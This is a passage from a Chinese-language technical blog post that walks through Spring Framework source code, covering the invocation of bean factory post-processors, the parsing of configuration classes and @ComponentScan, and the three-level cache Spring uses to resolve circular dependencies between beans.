else if (beanFactory.isTypeMatch(ppName, Ordered.class)) &#123;            orderedPostProcessorNames.add(ppName);        &#125;        //没有实现任何的优先级接口的  最后调用        else &#123;            nonOrderedPostProcessorNames.add(ppName);        &#125;    &#125;    //  排序    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);    // 先调用BeanFactoryPostProcessor实现了 PriorityOrdered接口的    invokeBeanFactoryPostProcessors(priorityOrderedPostProcessors, beanFactory);    //再调用BeanFactoryPostProcessor实现了 Ordered.    List&lt;BeanFactoryPostProcessor&gt; orderedPostProcessors = new ArrayList&lt;&gt;();    for (String postProcessorName : orderedPostProcessorNames) &#123;        orderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));    &#125;    sortPostProcessors(orderedPostProcessors, beanFactory);    invokeBeanFactoryPostProcessors(orderedPostProcessors, beanFactory);    //调用没有实现任何方法接口的    List&lt;BeanFactoryPostProcessor&gt; nonOrderedPostProcessors = new ArrayList&lt;&gt;();    for (String postProcessorName : nonOrderedPostProcessorNames) &#123;        nonOrderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));    &#125;    invokeBeanFactoryPostProcessors(nonOrderedPostProcessors, beanFactory);    //--------------------------处理BeanFactoryPostProcessor --End----------------------------    // Clear cached merged bean definitions since the post-processors might have    // modified the original metadata, e.g. replacing placeholders in values...    beanFactory.clearMetadataCache();    //---- BeanFactoryPostProcessor和BeanDefinitionRegistryPostProcessor调用完毕 --End---------&#125;\n\n这个方法稍微有点长，其中设计到Bean工厂后置处理器的执行顺序如下：\n\n解析配置类介绍完了Bean工厂的后置处理器的执行顺序，我们就详细介绍ConfigurationClassPostProcessor后置处理器解析配置类的执行流程。\nConfigurationClassPostProcessor是Spring中唯一实现了PriorityOrdered接口的内置Bean工厂后置处理器，所以它会第一个被调用：\nprivate static void invokeBeanDefinitionRegistryPostProcessors(\t\tCollection&lt;? extends BeanDefinitionRegistryPostProcessor&gt; postProcessors, BeanDefinitionRegistry registry) &#123;\t//获取容器中的ConfigurationClassPostProcessor的后置处理器进行bean定义的扫描\tfor (BeanDefinitionRegistryPostProcessor postProcessor : postProcessors) &#123;           //在这里再调用处理\t\tpostProcessor.postProcessBeanDefinitionRegistry(registry);\t&#125;&#125;@Overridepublic void  postProcessBeanDefinitionRegistry(BeanDefinitionRegistry registry) &#123;\tint registryId = System.identityHashCode(registry);       //这里都是进行一些判断 不太重要\tif (this.registriesPostProcessed.contains(registryId)) &#123;\t\tthrow new IllegalStateException(\t\t\t\t&quot;postProcessBeanDefinitionRegistry already called on this post-processor against &quot; + registry);\t&#125;\tif (this.factoriesPostProcessed.contains(registryId)) &#123;\t\tthrow new IllegalStateException(\t\t\t\t&quot;postProcessBeanFactory already called on this post-processor against &quot; + registry);\t&#125;   \tthis.registriesPostProcessed.add(registryId);\t//真正的解析我们的bean定义\tprocessConfigBeanDefinitions(registry);&#125;\n\n现在我们认真看它内部的处理方式\npublic void processConfigBeanDefinitions(BeanDefinitionRegistry registry) &#123;\tList&lt;BeanDefinitionHolder&gt; configCandidates = new ArrayList&lt;&gt;();       \t//获取IOC 容器中目前所有bean定义的名称\tString[] candidateNames = registry.getBeanDefinitionNames();\t//循环我们的上一步获取的所有的bean定义信息\tfor (String beanName : candidateNames) &#123;\t\t//通过bean的名称来获取我们的bean定义对象\t\tBeanDefinition beanDef = registry.getBeanDefinition(beanName);\t\t//判断是否有没有解析过\t\tif (ConfigurationClassUtils.isFullConfigurationClass(beanDef) ||\t\t\t\tConfigurationClassUtils.isLiteConfigurationClass(beanDef)) &#123;\t\t\tif (logger.isDebugEnabled()) &#123;\t\t\t\tlogger.debug(&quot;Bean definition has already been processed as a configuration class: &quot; + beanDef);\t\t\t&#125;\t\t&#125;           \t\t//进行正在的解析判断是不是完全的配置类 还是一个非正式的配置类\t\telse if (ConfigurationClassUtils.checkConfigurationClassCandidate(beanDef, this.metadataReaderFactory)) &#123;\t\t\t//满足添加 就加入到候选的配置类集合中\t\t\tconfigCandidates.add(new BeanDefinitionHolder(beanDef, beanName));\t\t&#125;\t&#125;\t// 若没有找到配置类 直接返回\tif (configCandidates.isEmpty()) &#123;\t\treturn;\t&#125;\t//对我们的配置类进行Order排序\tconfigCandidates.sort((bd1, bd2) -&gt; &#123;\t\tint i1 = ConfigurationClassUtils.getOrder(bd1.getBeanDefinition());\t\tint i2 = ConfigurationClassUtils.getOrder(bd2.getBeanDefinition());\t\treturn Integer.compare(i1, i2);\t&#125;);       //==========================================================================\t// 创建我们通过@CompentScan导入进来的bean name的生成器\t// 创建我们通过@Import导入进来的bean的名称\tSingletonBeanRegistry sbr = null;\tif (registry instanceof SingletonBeanRegistry) &#123;\t\tsbr = (SingletonBeanRegistry) registry;\t\tif (!this.localBeanNameGeneratorSet) &#123;\t\t\tBeanNameGenerator generator = (BeanNameGenerator) sbr.getSingleton(CONFIGURATION_BEAN_NAME_GENERATOR);\t\t\tif (generator != null) &#123;\t\t\t\t//设置@CompentScan导入进来的bean的名称生成器(默认类首字母小写）也可以自己定义，一般不会\t\t\t\tthis.componentScanBeanNameGenerator = generator;\t\t\t\t//设置@Import导入进来的bean的名称生成器(默认类首字母小写）也可以自己定义，一般不会\t\t\t\tthis.importBeanNameGenerator = generator;\t\t\t&#125;\t\t&#125;\t&#125;\tif (this.environment == null) &#123;\t\tthis.environment = new StandardEnvironment();\t&#125;\t//创建一个配置类解析器对象\tConfigurationClassParser parser = new ConfigurationClassParser(\t\t\tthis.metadataReaderFactory, this.problemReporter, this.environment,\t\t\tthis.resourceLoader, this.componentScanBeanNameGenerator, registry);\t//用于保存我们的配置类BeanDefinitionHolder放入上面筛选出来的配置类\tSet&lt;BeanDefinitionHolder&gt; candidates = new LinkedHashSet&lt;&gt;(configCandidates);\t//用于保存我们的已经解析的配置类，长度默认为解析出来默认的配置类的集合长度\tSet&lt;ConfigurationClass&gt; alreadyParsed = new HashSet&lt;&gt;(configCandidates.size());\t//do while 会进行第一次解析\tdo &#123;\t\t//真正的解析我们的配置类           //！！！！！！！！！！！\t\tparser.parse(candidates);\t\tparser.validate();\t\t//解析出来的配置类\t\tSet&lt;ConfigurationClass&gt; configClasses = new LinkedHashSet&lt;&gt;(parser.getConfigurationClasses());\t\tconfigClasses.removeAll(alreadyParsed);\t\t// Read the model and create bean definitions based on its content\t\tif (this.reader == null) &#123;\t\t\tthis.reader = new ConfigurationClassBeanDefinitionReader(\t\t\t\t\tregistry, this.sourceExtractor, this.resourceLoader, this.environment,\t\t\t\t\tthis.importBeanNameGenerator, parser.getImportRegistry());\t\t&#125;\t\t// 此处才把@Bean的方法和@Import 注册到BeanDefinitionMap中\t\tthis.reader.loadBeanDefinitions(configClasses);\t\t//加入到已经解析的集合中\t\talreadyParsed.addAll(configClasses);\t\tcandidates.clear();\t\t//判断我们ioc容器中的是不是&gt;候选原始的bean定义的个数\t\tif (registry.getBeanDefinitionCount() &gt; candidateNames.length) &#123;\t\t\t//获取所有的bean定义\t\t\tString[] newCandidateNames = registry.getBeanDefinitionNames();\t\t\t//原始的老的候选的bean定义\t\t\tSet&lt;String&gt; oldCandidateNames = new HashSet&lt;&gt;(Arrays.asList(candidateNames));\t\t\tSet&lt;String&gt; alreadyParsedClasses = new HashSet&lt;&gt;();\t\t\t//赋值已经解析的\t\t\tfor (ConfigurationClass configurationClass : alreadyParsed) &#123;\t\t\t\talreadyParsedClasses.add(configurationClass.getMetadata().getClassName());\t\t\t&#125;\t\t\tfor (String candidateName : newCandidateNames) &#123;\t\t\t\t//表示当前循环的还没有被解析过\t\t\t\tif (!oldCandidateNames.contains(candidateName)) &#123;\t\t\t\t\tBeanDefinition bd = registry.getBeanDefinition(candidateName);\t\t\t\t\t//判断有没有被解析过\t\t\t\t\tif (ConfigurationClassUtils.checkConfigurationClassCandidate(bd, this.metadataReaderFactory) &amp;&amp;\t\t\t\t\t\t\t!alreadyParsedClasses.contains(bd.getBeanClassName())) &#123;\t\t\t\t\t\tcandidates.add(new BeanDefinitionHolder(bd, candidateName));\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;\t\t\tcandidateNames = newCandidateNames;\t\t&#125;\t&#125;\t//存在没有解析过的 需要循环解析\twhile (!candidates.isEmpty());\t// Register the ImportRegistry as a bean in order to support ImportAware @Configuration classes\tif (sbr != null &amp;&amp; !sbr.containsSingleton(IMPORT_REGISTRY_BEAN_NAME)) &#123;\t\tsbr.registerSingleton(IMPORT_REGISTRY_BEAN_NAME, parser.getImportRegistry());\t&#125;\tif (this.metadataReaderFactory instanceof CachingMetadataReaderFactory) &#123;\t\t// Clear cache in externally provided MetadataReaderFactory; this is a no-op\t\t// for a shared cache since it&#x27;ll be cleared by the ApplicationContext.\t\t((CachingMetadataReaderFactory) this.metadataReaderFactory).clearCache();\t&#125;&#125;\n\n上面方法的主要逻辑大致如下：\n\n遍历Bean定义，获取所有配置类的Bean定义，并且根据是否加上@Configuration注解给其Bean定义添加Full或Lite属性。\n通过ConfigurationClassParser的parse方法解析配置类，这是核心。\n解析完后，如果发现解析出来了新的Bean定义，那么需要重复第 1 步直到所有的Bean都解析完成。\n\n下面我们就跟进到ConfigurationClassParser的parse方法，看看如何解析配置类：\npublic void parse(Set&lt;BeanDefinitionHolder&gt; configCandidates) &#123;    /**\t* 用于来保存延时的ImportSelectors，最最最著名的代表就是我们的SpringBoot自动装配的的类    * AutoConfigurationImportSelector\t*/    this.deferredImportSelectors = new LinkedList&lt;&gt;();    // 循环配置类    for (BeanDefinitionHolder holder : configCandidates) &#123;        BeanDefinition bd = holder.getBeanDefinition();        try &#123;            //真正的解析我们的bean定义 :通过注解元数据 解析            if (bd instanceof AnnotatedBeanDefinition) &#123;                parse(((AnnotatedBeanDefinition) bd).getMetadata(), holder.getBeanName());            &#125;            else if (bd instanceof AbstractBeanDefinition &amp;&amp; ((AbstractBeanDefinition) bd).hasBeanClass()) &#123;                parse(((AbstractBeanDefinition) bd).getBeanClass(), holder.getBeanName());            &#125;            else &#123;                parse(bd.getBeanClassName(), holder.getBeanName());            &#125;        &#125;        catch (BeanDefinitionStoreException ex) &#123;            throw ex;        &#125;        catch (Throwable ex) &#123;            throw new BeanDefinitionStoreException(                &quot;Failed to parse configuration class [&quot; + bd.getBeanClassName() + &quot;]&quot;, ex);        &#125;    &#125;    //处理我们延时的DeferredImportSelectors w我们springboot就是通过这步进行记载spring.factories文件中的自定装配的对象    processDeferredImportSelectors();&#125;protected final void parse(AnnotationMetadata metadata, String beanName) throws IOException &#123;    /**\t* 第一步:把我们的配置类源信息和beanName包装成一个ConfigurationClass 对象\t*/    processConfigurationClass(new ConfigurationClass(metadata, beanName));&#125;protected void processConfigurationClass(ConfigurationClass configClass) throws IOException &#123;    ......        // Recursively process the configuration class and its superclass hierarchy.递归处理配置类及其超类层次结构。        SourceClass sourceClass = asSourceClass(configClass);    //真正的进行配置类的解析    do &#123;        //解析我们的配置类        sourceClass = doProcessConfigurationClass(configClass, sourceClass);    &#125;    while (sourceClass != null);    // 这里把解析出来的SourceClass放入configurationClasses中    // 主要是@Import、@Bean、@ImportRosource等没有注册的Bean    this.configurationClasses.put(configClass, configClass);&#125;\n\n层层向下，终于到了解析配置类\n@Nullableprotected final SourceClass doProcessConfigurationClass(ConfigurationClass configClass, SourceClass sourceClass)    throws IOException &#123;    // 这里终于开始解析配置类了，顺序如下：    // @PropertySources-@ComponentScan-@Import-@ImportResource-@Bean    // Recursively process any member (nested) classes first    processMemberClasses(configClass, sourceClass);    //处理我们的@propertySource注解的    for (AnnotationAttributes propertySource : AnnotationConfigUtils.attributesForRepeatable(        sourceClass.getMetadata(), PropertySources.class,        org.springframework.context.annotation.PropertySource.class)) &#123;        if (this.environment instanceof ConfigurableEnvironment) &#123;            processPropertySource(propertySource);        &#125;        else &#123;            logger.warn(&quot;Ignoring @PropertySource annotation on [&quot; + sourceClass.getMetadata().getClassName() +                        &quot;]. Reason: Environment must implement ConfigurableEnvironment&quot;);        &#125;    &#125;    //解析我们的 @ComponentScan 注解    //从我们的配置类上解析处ComponentScans的对象集合属性    Set&lt;AnnotationAttributes&gt; componentScans = AnnotationConfigUtils.attributesForRepeatable(        sourceClass.getMetadata(), ComponentScans.class, ComponentScan.class);    //开始判断是否有这个属性，有的话就解析    if (!componentScans.isEmpty() &amp;&amp;        !this.conditionEvaluator.shouldSkip(sourceClass.getMetadata(), ConfigurationPhase.REGISTER_BEAN)) &#123;        //循环解析 我们解析出来的AnnotationAttributes        for (AnnotationAttributes componentScan : componentScans) &#123;            //把我们扫描出来的类变为bean定义的集合 真正的解析            //这里是@ComponentScan注解的核心            Set&lt;BeanDefinitionHolder&gt; scannedBeanDefinitions =                this.componentScanParser.parse(componentScan, sourceClass.getMetadata().getClassName());            //获取到了扫描后的Bean定义            //循环处理我们包扫描出来的bean定义            for (BeanDefinitionHolder holder : scannedBeanDefinitions) &#123;                //获取Bean定义                BeanDefinition bdCand = holder.getBeanDefinition().getOriginatingBeanDefinition();                //判断空                if (bdCand == null) &#123;                    bdCand = holder.getBeanDefinition();                &#125;                //判断当前扫描出来的bean定义是不是一个配置类,若是的话 直接进行递归解析                if (ConfigurationClassUtils.checkConfigurationClassCandidate(bdCand, this.metadataReaderFactory)) &#123;                    //递归解析 因为@Component算是lite配置类                    parse(bdCand.getBeanClassName(), holder.getBeanName());                &#125;            &#125;        &#125;    &#125;    // 处理 @Import annotations    processImports(configClass, sourceClass, getImports(sourceClass), true);    // 处理 @ImportResource annotations    AnnotationAttributes importResource =        AnnotationConfigUtils.attributesFor(sourceClass.getMetadata(), ImportResource.class);    if (importResource != null) &#123;        String[] resources = importResource.getStringArray(&quot;locations&quot;);        Class&lt;? extends BeanDefinitionReader&gt; readerClass = importResource.getClass(&quot;reader&quot;);        for (String resource : resources) &#123;            String resolvedResource = this.environment.resolveRequiredPlaceholders(resource);            configClass.addImportedResource(resolvedResource, readerClass);        &#125;    &#125;    // 处理 @Bean methods 获取到我们配置类中所有标注了@Bean的方法    Set&lt;MethodMetadata&gt; beanMethods = retrieveBeanMethodMetadata(sourceClass);    for (MethodMetadata methodMetadata : beanMethods) &#123;        configClass.addBeanMethod(new BeanMethod(methodMetadata, configClass));    &#125;    // 处理配置类接口 默认方法的@Bean    processInterfaces(configClass, sourceClass);    // 处理配置类的父类的 ，循环再解析    if (sourceClass.getMetadata().hasSuperClass()) &#123;        String superclass = sourceClass.getMetadata().getSuperClassName();        if (superclass != null &amp;&amp; !superclass.startsWith(&quot;java&quot;) &amp;&amp;            !this.knownSuperclasses.containsKey(superclass)) &#123;            this.knownSuperclasses.put(superclass, configClass);            // Superclass found, return its annotation metadata and recurse            return sourceClass.getSuperClass();        &#125;    &#125;    // 没有父类解析完成    return null;&#125;\n\n绕了半天，终于看到我们熟悉的注解了！注解对应配置类的解析顺序如下：\n\n@ComponentScan的解析我们从刚刚来看，是如何进来的\n@Nullableprotected final SourceClass doProcessConfigurationClass(ConfigurationClass configClass, SourceClass sourceClass)    throws IOException &#123;    .......        //解析我们的 @ComponentScan 注解        //从我们的配置类上解析处ComponentScans的对象集合属性        Set&lt;AnnotationAttributes&gt; componentScans = AnnotationConfigUtils.attributesForRepeatable(        sourceClass.getMetadata(), ComponentScans.class, ComponentScan.class);    if (!componentScans.isEmpty() &amp;&amp;        !this.conditionEvaluator.shouldSkip(sourceClass.getMetadata(), ConfigurationPhase.REGISTER_BEAN)) &#123;        //循环解析 我们解析出来的AnnotationAttributes        for (AnnotationAttributes componentScan : componentScans) &#123;            //把我们扫描出来的类变为bean定义的集合 真正的解析            Set&lt;BeanDefinitionHolder&gt; scannedBeanDefinitions =                this.componentScanParser.parse(componentScan, sourceClass.getMetadata().getClassName());            //循环处理我们包扫描出来的bean定义            for (BeanDefinitionHolder holder : scannedBeanDefinitions) &#123;                BeanDefinition bdCand = holder.getBeanDefinition().getOriginatingBeanDefinition();                if (bdCand == null) &#123;                    bdCand = holder.getBeanDefinition();                &#125;                //判断当前扫描出来的bean定义是不是一个配置类,若是的话 直接进行递归解析                if (ConfigurationClassUtils.checkConfigurationClassCandidate(bdCand, this.metadataReaderFactory)) &#123;                    //递归解析 因为@Component算是lite配置类                    parse(bdCand.getBeanClassName(), holder.getBeanName());                &#125;            &#125;        &#125;    &#125;    .....        // 没有父类解析完成        return null;&#125;\n\n很显然看到它是按如下的步骤进入的\n//把我们扫描出来的类变为bean定义的集合 真正的解析Set&lt;BeanDefinitionHolder&gt; scannedBeanDefinitions =\t\t\tthis.componentScanParser.parse(componentScan,                              \t\t\t\t\t\t\t\t\tsourceClass.getMetadata().getClassName());\n\n那么我们现在进入这个方法详细说说\npublic Set&lt;BeanDefinitionHolder&gt; parse(AnnotationAttributes componentScan, final String declaringClass) &#123;\t\t// 创建一个扫描器scanner       \t// 还记得在创建AnnotationConfigApplicationContext的时候创建的那个扫描器吗       \t// 当时说了那个扫描器只是供程序员外部调用，这里就证明了   \t    // 在Spring内部，实际上执行扫描的只会是这里创建的scanner对象\tClassPathBeanDefinitionScanner scanner = new ClassPathBeanDefinitionScanner(this.registry,\t\t\tcomponentScan.getBoolean(&quot;useDefaultFilters&quot;), this.environment, this.resourceLoader);       // 判断是否重写了默认的命名规则\tClass&lt;? extends BeanNameGenerator&gt; generatorClass = componentScan.getClass(&quot;nameGenerator&quot;);    \tboolean useInheritedGenerator = (BeanNameGenerator.class == generatorClass);\tscanner.setBeanNameGenerator(useInheritedGenerator ? this.beanNameGenerator :\t\t\tBeanUtils.instantiateClass(generatorClass));\t// 解析scopedProxy属性，该属性可以将Bean创建为JDK代理/CGLib代理\tScopedProxyMode scopedProxyMode = componentScan.getEnum(&quot;scopedProxy&quot;);\tif (scopedProxyMode != ScopedProxyMode.DEFAULT) &#123;\t\tscanner.setScopedProxyMode(scopedProxyMode);\t&#125;\telse &#123;\t\tClass&lt;? extends ScopeMetadataResolver&gt; resolverClass = componentScan.getClass(&quot;scopeResolver&quot;);\t\tscanner.setScopeMetadataResolver(BeanUtils.instantiateClass(resolverClass));\t&#125;\tscanner.setResourcePattern(componentScan.getString(&quot;resourcePattern&quot;));              // 解析includeFilters属性\tfor (AnnotationAttributes filter : componentScan.getAnnotationArray(&quot;includeFilters&quot;)) &#123;\t\tfor (TypeFilter typeFilter : typeFiltersFor(filter)) &#123;               // 当调用addIncludeFilter/addExcludeFilter时仅仅把定义的规则保存下来               // 并没有真正去执行匹配过程\t\t\tscanner.addIncludeFilter(typeFilter);\t\t&#125;\t&#125;       // 解析excludeFilters属性\tfor (AnnotationAttributes filter : componentScan.getAnnotationArray(&quot;excludeFilters&quot;)) &#123;\t\tfor (TypeFilter typeFilter : typeFiltersFor(filter)) &#123;\t\t\tscanner.addExcludeFilter(typeFilter);\t\t&#125;\t&#125;\t// 是否懒加载\tboolean lazyInit = componentScan.getBoolean(&quot;lazyInit&quot;);\tif (lazyInit) &#123;\t\tscanner.getBeanDefinitionDefaults().setLazyInit(true);\t&#125;\t// 拿到包路径basePackages\tSet&lt;String&gt; basePackages = new LinkedHashSet&lt;&gt;();\tString[] basePackagesArray = componentScan.getStringArray(&quot;basePackages&quot;);\tfor (String pkg : basePackagesArray) &#123;\t\tString[] tokenized = StringUtils.tokenizeToStringArray(this.environment.resolvePlaceholders(pkg),\t\t\t\tConfigurableApplicationContext.CONFIG_LOCATION_DELIMITERS);\t\tCollections.addAll(basePackages, tokenized);\t&#125;       /** 从下面的代码可以看出ComponentScans指定扫描目标，除了最常用的basePackages         * 还有两种方式:         * 1. 指定basePackageClasses，就是指定多个类，只要是与这几个类同级，         *    或者在这几个类下级的都可以被扫描到，这种方式其实是spring比较推荐的，         *    因为指定basePackages没有IDE的检查，容易出错，但是指定一个类         *    就有IDE的检查了，不容易出错，经常会用一个空的类来作为basePackageClasses         * 2. 直接不指定，默认会把与配置类同级，或者在配置类下级的作为扫描目标         */\tfor (Class&lt;?&gt; clazz : componentScan.getClassArray(&quot;basePackageClasses&quot;)) &#123;\t\tbasePackages.add(ClassUtils.getPackageName(clazz));\t&#125;\tif (basePackages.isEmpty()) &#123;\t\tbasePackages.add(ClassUtils.getPackageName(declaringClass));\t&#125;       // 把规则填充到排除规则，这里就把注册类自身当作排除规则，真正执行匹配的时候会把自身给排除\tscanner.addExcludeFilter(           new AbstractTypeHierarchyTraversingFilter(false, false) &#123;\t\t@Override\t\tprotected boolean matchClassName(String className) &#123;\t\t\treturn declaringClass.equals(className);\t\t&#125;\t&#125;);       // 先把basePackages转为字符串数组的形式\t// 通过扫描器scanner的doScan扫描\treturn scanner.doScan(StringUtils.toStringArray(basePackages));&#125;\n\n可以看到它的流程是\n1、创建一个扫描器scanner\n2、解析了一些属性，代理【特别includeFilters属性\n3、然后通过扫描器scanner的doScan扫描\n好的，我们接着进入\nprotected Set&lt;BeanDefinitionHolder&gt; doScan(String... basePackages) &#123;   Assert.notEmpty(basePackages, &quot;At least one base package must be specified&quot;);   //最后也是返回一个Bean定义集合   // 保存解析后的Bean定义集合   Set&lt;BeanDefinitionHolder&gt; beanDefinitions = new LinkedHashSet&lt;&gt;();       // 循环需要扫描的包路径   for (String basePackage : basePackages) &#123;      // findCandidateComponents方法根据包名找到符合条件的BeanDefinition集合      Set&lt;BeanDefinition&gt; candidates = findCandidateComponents(basePackage);             for (BeanDefinition candidate : candidates) &#123;         // 解析@Scope注解         ScopeMetadata scopeMetadata = this.scopeMetadataResolver.resolveScopeMetadata(candidate);                   candidate.setScope(scopeMetadata.getScopeName());         String beanName = this.beanNameGenerator.generateBeanName(candidate, this.registry);         // 下面的两个if都会进入         if (candidate instanceof AbstractBeanDefinition) &#123;            // 内部会设置默认属性            postProcessBeanDefinition((AbstractBeanDefinition) candidate, beanName);         &#125;          // 如果是AnnotatedBeanDefinition，还会再设置一次值         if (candidate instanceof AnnotatedBeanDefinition) &#123;            // 解析@Lazy注解            AnnotationConfigUtils.processCommonDefinitionAnnotations(                (AnnotatedBeanDefinition) candidate);         &#125;         //把我们解析出来的组件bean定义注册到我们的IOC容器中（容器中没有才注册）         if (checkCandidate(beanName, candidate)) &#123;            BeanDefinitionHolder definitionHolder = new BeanDefinitionHolder(candidate, beanName);            definitionHolder =                  AnnotationConfigUtils.applyScopedProxyMode(scopeMetadata, definitionHolder, this.registry);                         beanDefinitions.add(definitionHolder);            // 最终来到这，完成bean定义的注册            registerBeanDefinition(definitionHolder, this.registry);         &#125;      &#125;   &#125;   return beanDefinitions;&#125;\n\n可以看到它的解析过程，new一个Set&lt;BeanDefinitionHolder&gt;，然后扫描包路径\n对扫描后的Bean定义进行一些配置，最后添加到beanDefinitions，最后registerBeanDefinition完成注册。\npublic Set&lt;BeanDefinition&gt; findCandidateComponents(String basePackage) &#123;    // spring支持component索引技术，需要引入一个组件，因为大部分情况不会引入这个组件    // 所以不会进入到这个if    if (this.componentsIndex != null &amp;&amp; indexSupportsIncludeFilters()) &#123;        return addCandidateComponentsFromIndex(this.componentsIndex, basePackage);    &#125;    else &#123;        //调用scanCandidateComponents        return scanCandidateComponents(basePackage);    &#125;&#125;private Set&lt;BeanDefinition&gt; scanCandidateComponents(String basePackage) &#123;\tSet&lt;BeanDefinition&gt; candidates = new LinkedHashSet&lt;&gt;();\ttry &#123;           // 把传进来的basePackage字符串转换成文件路径的形式           // com.xx -&gt; classpath*:com/xx/**/*.class\t\tString packageSearchPath = ResourcePatternResolver.CLASSPATH_ALL_URL_PREFIX +\t\t\t\tresolveBasePackage(basePackage) + &#x27;/&#x27; + this.resourcePattern;                   // 根据路径，获得符合要求的文件\t\tResource[] resources = getResourcePatternResolver().getResources(packageSearchPath);\t\tboolean traceEnabled = logger.isTraceEnabled();\t\tboolean debugEnabled = logger.isDebugEnabled();\t\tfor (Resource resource : resources) &#123;\t\t\tif (traceEnabled) &#123;\t\t\t\tlogger.trace(&quot;Scanning &quot; + resource);\t\t\t&#125;               // 判断资源是否可读，并且不是一个目录\t\t\tif (resource.isReadable()) &#123;\t\t\t\ttry &#123;                       //metadataReader元数据读取器，用来解析resource\t\t\t\t\tMetadataReader metadataReader = getMetadataReaderFactory().getMetadataReader(resource);\t\t\t\t\tif (isCandidateComponent(metadataReader)) &#123;\t\t\t\t\t\tScannedGenericBeanDefinition sbd = new ScannedGenericBeanDefinition(metadataReader);\t\t\t\t\t\tsbd.setSource(resource);                           // 在isCandidateComponent方法内部会真正执行匹配规则                           // 这里就会扫描到@Component对应的类                           // 考虑排除、包含并且对接口、抽象类进行处理\t\t\t\t\t\t// 比如Mybatis要重写这个类，因为Mybatis接口也要扫描（@Mapper）\t\t\t\t\t\tif (isCandidateComponent(sbd)) &#123;\t\t\t\t\t\t\tif (debugEnabled) &#123;\t\t\t\t\t\t\t\tlogger.debug(&quot;Identified candidate component class: &quot; + resource);\t\t\t\t\t\t\t&#125;\t\t\t\t\t\t\t// 最后加入集合\t\t\t\t\t\t\tcandidates.add(sbd);\t\t\t\t\t\t&#125;\t\t\t                  ....                             // 返回结果\treturn candidates;&#125;\n\n最后我们来总结一下@ComponentScan的解析过程：\n\n循环依赖解决什么是循环依赖什么是循环依赖？请看下面代码：\n@Componentpublic class BeanA &#123;    @Autowired    private BeanB beanB;&#125;@Componentpublic class BeanB &#123;    @Autowired    private BeanA beanA;&#125;\n\n这就是循环依赖，A依赖B并且B依赖A。我们之前介绍了Spring中Bean的生命周期和创建流程，包括实例化、属性赋值和初始化三个阶段，最终Bean会被存入一级缓存中(单例池)。如果按照下面的流程会怎么样：\n\n很明显死循环了，这样是行不通的。Spring当然不会这么傻，Spring引入了三级缓存来解决循环依赖的问题，下面我们逐步介绍。\n三个缓存一级缓存假设只有一级缓存，上面我们说了如果在初始化之后才将Bean放入一级缓存，那肯定会出现死循环，我们进行如下改进：\n\n在实例化之后，直接把Bean加入一级缓存，每次获取Bean时先去一级缓存拿，如果拿到了就直接返回。这样可以吗？我们来走一遍流程：\n\n开始创建A，实例化完成后将A放入一级缓存\nA开始属性赋值，发现依赖B，开始创建B\nB实例化完成后，将B放入一级缓存\nB开始属性赋值，发现依赖A，开始创建A\n因为第2步，B可以从一级缓存拿到A，B完成属性赋值，接着完成初始化\nB创建完成，回到A，A完成属性赋值，接着完成初始化\n\n\n这里注意一下，实例化后就放入一级缓存，这时的Bean属于早期对象，因为还没有完成赋值等操作。但是由于创建过程中一直持有该Bean的引用，所以初始化完成后，一级缓存中的Bean会变为成熟对象。\n\n好像没问题了，解决了死循环，并且A、B都初始化成功！但是，这样设计无法保证多线程情况下的安全问题：\n\n可能存在多个线程同时创建Bean，此时一个线程正在创建Bean时，如果另一个线程访问了一级缓存就会拿到不完整的Bean。\n其实就是当我们一级缓存中有Bean_liduoan，然而我们某个线程发现有这个Bean，想使用Bean_liduoan.XXX()方法时，发现这个Bean是早期对象，很多东西都没有完成。\n\n那如何解决？可以通过加锁解决 (这里必须是可重入锁，不然会死锁)，但是由于只有一级缓存，无论怎么锁，一个线程创建Bean的时候就别的线程就没法从缓存中拿Bean，这样性能会大打折扣。我们看看Spring是如何解决的：\n二级缓存Spring引入了二级缓存，来解决多线程下性能和并发安全的问题：\n\n引入二级缓存后，一级缓存专门用来存放成熟的Bean，二级缓存专门用来存放早期的Bean。流程如下：\n\n首次getBean(A)时先从一级缓存中拿，第一次不能从二级缓存中拿，因为可能会拿到不成熟的Bean。如果没拿到下一步开始创建A。\n实例化A完成后，将早期的A加入二级缓存，开始属性赋值，发现A依赖B。\n通过getBean(B)开始递归创建B，先从一级缓存中拿，没有再从二级缓存中拿，没拿到下一步开始创建B。\n实例化B完成后，将早期的B加入二级缓存，开始属性赋值，发现B依赖A。\n又通过getBean(A)开始递归创建A，先从一级缓存中拿，没有再从二级缓存中拿，这里由于第2步，可以从二级缓存中拿到A。\nB拿到A后完成属性赋值，接着完成实例化，B创建完成，加入一级缓存。\nB创建完成后A完成属性赋值，接着完成实例化，A创建完成，加入一级缓存。\n\n\n这里有一个问题：第1步、第3步和第5步怎么区别getBean()是只能从一级缓存中拿，还是可以到所有缓存中拿？\n\n加锁：当Bean正在创建的时候会通过synchronized加一把锁，访问二级、三级缓存的时候也会通过synchronized加同一把锁。这样当某个线程正在创建Bean的时候，其它线程是不能访问二、三级缓存的，只能访问一级缓存。\n做标记：Spring中引入了一个存放正在创建的Bean的集合用于限制对二、三级缓存的访问，Bean开始创建时会加入这个集合。从缓存中获取Bean的时候，如果该Bean正在创建，也就是出现在了这个集合中 (说明出现循环依赖)，那么可以从所有缓存中拿，否则只能在一级缓存中拿。\n\n这样两点保证了不会出现在非创建阶段从二、三级缓存中获取到不完整Bean的情况。\n\n引入二级缓存后，锁加在Bean的创建过程，这样加锁不会影响别的线程从一级缓存中拿成熟的Bean。这样又解决了多线程下性能和并发安全的问题，完美！那真的一点问题都没有了吗？\n如果存在AOP，需要对Bean进行动态代理，怎么办？首先考虑一下如果按照我们上面的设计方案，动态代理需要在哪里进行：\n\n在Bean初始化完成后代理行吗？不行。因为如果A、B循环依赖，A在初始化完后才动态代理，由于动态代理会生成一个新的对象，那么B注入的将会是没有代理的A。\n在Bean实例化之后、加入二级缓存前代理行吗？这样加入二级缓存的就是代理对象，解决了上面一个问题。最后还需要注意，完成Bean初始化后，将二级缓存中代理过的对象移入一级缓存即可，防止一级缓存中存放的是未代理对象。\n\n所以说，在Bean实例化之后、加入二级缓存前，如果需要动态代理就进行代理，然后将代理的对象存入二级缓存，这样其实是没问题的。如下图所示：\n那为什么要加入三级缓存，三级缓存又是干什么的？\n三级缓存通过我们上面的分析，二级缓存就可以解决循环依赖、多线程并发和AOP的所有问题。那么Spring引入三级缓存是为了什么？我们来看看三级缓存的里存的是什么：\n/** 一级缓存   * 单例缓存池，用于保存所有成熟的Bean 